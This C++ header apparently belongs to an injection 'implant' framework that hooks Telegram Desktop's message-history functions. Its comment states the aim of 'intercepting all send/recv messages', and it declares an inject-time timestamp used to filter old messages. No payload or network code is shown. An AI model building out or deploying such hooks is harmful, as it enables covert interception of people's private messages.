#pragma once

#include <implant/helpers.hpp>
#include <ctime>

namespace implant {

	// brief: intercepting all send/recv messages.

	class c_broadcast : public c_implant {

	public:

#ifdef _WIN64
		c_broadcast() : c_implant(generate_signature_ref("", "")) {};
		implant_make_preset("tg_broadcast", gsl::not_null<HistoryItem*>* __fastcall, handler, History*, gsl::not_null <HistoryItem*>*, gsl::not_null <HistoryItem*>, bool);
#endif

        virtual void set_broadcast_enabled(bool enable);

	protected:

		// "bug" with using addNewItem.
		// 
		// since "addNewItem" also called on application start when all messages being added to history again,
		// we need to prevent it just by checking their sending date and comparing it with inject-time date.
		static std::time_t g_timestamp;
        static bool is_broadcast_enabled;

	};

}